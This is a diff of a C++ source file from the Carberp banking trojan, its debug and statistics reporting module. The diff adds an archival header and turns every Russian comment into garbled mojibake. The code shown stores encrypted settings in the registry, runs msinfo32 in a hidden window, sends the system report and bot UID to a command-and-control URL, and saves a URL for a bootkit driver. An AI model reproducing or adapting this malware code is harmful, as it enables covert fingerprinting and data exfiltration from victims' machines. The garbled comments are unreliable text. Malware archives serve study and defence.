@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <shlobj.h>
 
 #include "BotCore.h"
@@ -17,7 +28,7 @@ namespace DBGRPTDEBGTEMPLATES
 
 #define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>
 
-// Структура настроек статистической отчетности
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct DebugReportSettings
 {
 	bool  Enabled;
@@ -25,19 +36,19 @@ struct DebugReportSettings
 	PCHAR StatUrl;
 };
 
-// Статистические переменные модуля DbgRpt.cpp
-// Инициализируются в DebugReportInit()
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DbgRpt.cpp
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ DebugReportInit()
 static CRITICAL_SECTION     DbgRptCs;
 static DebugReportSettings  DbgRptSettingDefault;
 static DebugReportSettings* DbgRptSettings = NULL;
 
 
-// Предварительно объявление методов
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void DebugReportLoadSettings();
 void DebugReportUpdateSettingsThread(void* Arguments);
 
-// Инициализация статических переменных модуля.
-// Должна вызыватся при старте до использования ф-ций модуля.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 void DebugReportInit()
 {
 	DBGRPTDBG("DebugReportInit", "Start initialize debug reporting (DbgRptSettings=0x%X).", 
@@ -51,12 +62,12 @@ void DebugReportInit()
 	
 	DbgRptSettings = &DbgRptSettingDefault;
 
-	// Запускам процесс чтения настроек из реестра
-	// Необходимо для применения в процессах, которые не выполняют команд (explorer, winlogon и тд)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (explorer, winlogon пїЅ пїЅпїЅ)
 	StartThread(DebugReportUpdateSettingsThread, NULL);
 }
 
-// Ф-ция конструктор для структуры DebugReportSettings
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DebugReportSettings
 DebugReportSettings* DebugReportAllocSettings(bool Enabled, 
 	const char* StatPrefix, const char* StatUrl)
 {
@@ -69,7 +80,7 @@ DebugReportSettings* DebugReportAllocSettings(bool Enabled,
 	return result;
 }
 
-// Ф-ция деструктор для структуры DebugReportSettings
+// пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DebugReportSettings
 void DebugReportFreeSettings(DebugReportSettings* settings)
 {
 	if (settings == NULL) return;
@@ -81,7 +92,7 @@ void DebugReportFreeSettings(DebugReportSettings* settings)
 	FreeStruct(settings);
 }
 
-// Формирования строки UID с указанным префиксом
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ UID пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 string GenerateUidAsString(const string& Prefix)
 {
 	string  uid = Prefix;
@@ -93,7 +104,7 @@ string GenerateUidAsString(const string& Prefix)
 	return uid;
 }
 
-// Формирования GUIDа из UIDа без префикса
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GUIDпїЅ пїЅпїЅ UIDпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 string CreateGuidFromUid(const string& uid)
 {
 	string wide_uid;
@@ -118,13 +129,13 @@ string CreateGuidFromUid(const string& uid)
 	return guid;
 }
 
-// Создание(или открытие, если уже был создан) ключа в реестре для сохранения 
-// шифрованных настроек статистической отчетности
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ) пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 HKEY CreateSettingKey()
 {
-	// ВНИМАНИЕ: сейчас всё сохраняется в HKEY_LOCAL_MACHINE
-	// Сделан задел на добавление сохранения еще и HKEY_CURRENT_USER, если этот 
-	// даст плохие отстуки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ HKEY_LOCAL_MACHINE
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ HKEY_CURRENT_USER, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	HKEY    roots[2] = {HKEY_LOCAL_MACHINE /*, HKEY_CURRENT_USER*/};
 	HKEY    key = NULL;
@@ -145,8 +156,8 @@ HKEY CreateSettingKey()
 	return NULL;
 }
 
-// Получение изменяемого имени параметра. 
-// Тоже используется UID без префикса
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. 
+// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ UID пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 string GetValueName(const string& Suffix)
 {
 	string Uid = GenerateUidAsString("");
@@ -159,8 +170,8 @@ string GetValueName(const string& Suffix)
 	return ValueName;
 }
 
-// Загрузка параметров команды installbkstat из реестра 
-// одновременно с дешифровкой
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ installbkstat пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool DebugReportLoadParamList(string * ParamList)
 {
 	HKEY key = CreateSettingKey();
@@ -194,8 +205,8 @@ bool DebugReportLoadParamList(string * ParamList)
 	return true;
 }
 
-// Сохранение параметров команды installbkstat в реестр 
-// одновременно с шифрованием
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ installbkstat пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool DebugReportSaveParamList(const string & ParamList)
 {
 	HKEY key = CreateSettingKey();
@@ -217,8 +228,8 @@ bool DebugReportSaveParamList(const string & ParamList)
 	return true;
 }
 
-// Загрузка настроек из реестра в структуру настроек.
-// Учитывается возможность работы в мультипоточной среде.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 void DebugReportLoadSettings()
 {
 	string ParamList;
@@ -240,18 +251,18 @@ void DebugReportLoadSettings()
 	DebugReportSettings* NewSettings = CreateStruct(DebugReportSettings);
 	DebugReportSettings* OldSettings = NULL;
 
-	// Если хотя бы один пустой параметр - то это означает что они неверно заданы 
-	// и стука не включен.
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
+	// пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	NewSettings->Enabled = (StatPrefix.Length() > 0) && (StatUrl.Length() > 0);
 
-	// URL приходит без символа начала параметров
-	// Поскольку раньше URL был с таки символом - просто добавляем его по умолчанию.
+	// URL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	StatUrl += "?";
 
 	NewSettings->StatPrefix = STR::New(StatPrefix.t_str());
 	NewSettings->StatUrl    = STR::New(StatUrl.t_str());
 
-	// При замене необходимо защитить DbgRptSettings, потому что его могут читать где-то
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DbgRptSettings, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ
 	pEnterCriticalSection(&DbgRptCs);
 
 	OldSettings = DbgRptSettings;
@@ -262,10 +273,10 @@ void DebugReportLoadSettings()
 	DebugReportFreeSettings(OldSettings);
 }
 
-// Поток для обновления настроек для подсистемы сбора статистики
-// Сделано для будущей команды обновления параметров статистики
-// Обеспечивает общесистемное применение настроек через 10 минут после 
-// установки новых параметров
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 10 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void DebugReportUpdateSettingsThread(void* Arguments)
 {
 	while (true)
@@ -277,27 +288,27 @@ void DebugReportUpdateSettingsThread(void* Arguments)
 	}
 }
 
-// Сохранение настроек в реестр.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 void DebugReportSaveSettings(const char* ParamsList)
 {
 	DBGRPTDBG("DebugReportSaveSettings", "Started with ParamsList='%s'", ParamsList);
 	
-	// Сохраняем список параметров в реестр
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportSaveParamList(ParamsList);
 
-	// Сразу же подгружаем их обратно для немедленного применения
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportLoadSettings();
 }
 
-// Получение копии настроек
-// Копия делает из-за возможной работы в мультипоточной среде.
-// Чтобы не делать защиту общих данных там, где их используют,
-// делаем защиту только при загрузке и получении копии.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 DebugReportSettings* DebugReportGetSettings()
 {
 	DebugReportSettings* result = NULL;
 
-	// При чтении защищаемся от изменения текущего DbgRptSettings
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DbgRptSettings
 	pEnterCriticalSection(&DbgRptCs);
 
 	if (DbgRptSettings == &DbgRptSettingDefault)
@@ -313,15 +324,15 @@ DebugReportSettings* DebugReportGetSettings()
 	return result;
 }
 
-// Запуск тестов работы загрузки/выгрузки/получения настроек
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void DebugReportRunTests()
 {
 	DebugReportInit();
 
-	// Загрузить список параметров
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportLoadSettings();
 
-	// Сохранить список параметров
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportSaveSettings("param1 param2 param3");
 
 	const char* params[] = 
@@ -332,10 +343,10 @@ void DebugReportRunTests()
 
 	for (DWORD i = 0; i < ARRAYSIZE(params); i++)
 	{
-		// Сохранить список параметров
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DebugReportSaveSettings(params[i]);
 
-		// Получить настройки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DebugReportSettings* settings = DebugReportGetSettings();
 
 		DBGRPTDBG("DebugReportTest",
@@ -620,12 +631,12 @@ void DebugReportCreateConfigReportAndSend()
 
 	do
 	{
-		// Получаем путь к msinfo32.exe
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ msinfo32.exe
 		MsInfoPath = GetPathToMsInfo32();
 		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetPathToMsInfo32() return '%s;", MsInfoPath);
 		if (MsInfoPath == NULL) break;
 
-		// Временный файл для отчета
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		ReportPath = File::GetTempNameA();
 		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "GetTempNameA() for report file return '%s;", ReportPath);
 		if (ReportPath == NULL) break;
@@ -640,7 +651,7 @@ void DebugReportCreateConfigReportAndSend()
 		m_memset(&pi, 0, sizeof(pi));
 		m_memset(MsInfoParam, 0, STR::Length(MsInfoParam));
 
-		// Запускаем скрытно
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		si.cb = sizeof(si);
 		si.wShowWindow = SW_HIDE;
 		
@@ -721,7 +732,7 @@ bool GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "step");
 	AddURLParam(Fields, "uid", BotUid.t_str());
-	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
+	AddURLParam(Fields, "step", "170_dr"); //170_dr пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Params = Strings::GetText(Fields, "&");
 	PCHAR URL = STR::New(2, settings->StatUrl, Params);
@@ -835,7 +846,7 @@ bool DebugReportSaveUrlForBootkitDriver()
 	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegCreateKeyExW return 0x%X", key_created);
 	if (key_created != ERROR_SUCCESS) return false;
 
-	// Сохраняем на всякий пожарный с 0 в конце
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅ
 	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
 		(DWORD)plstrlenA(url));
 	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegSetValueExW return 0x%X", url_value_set);
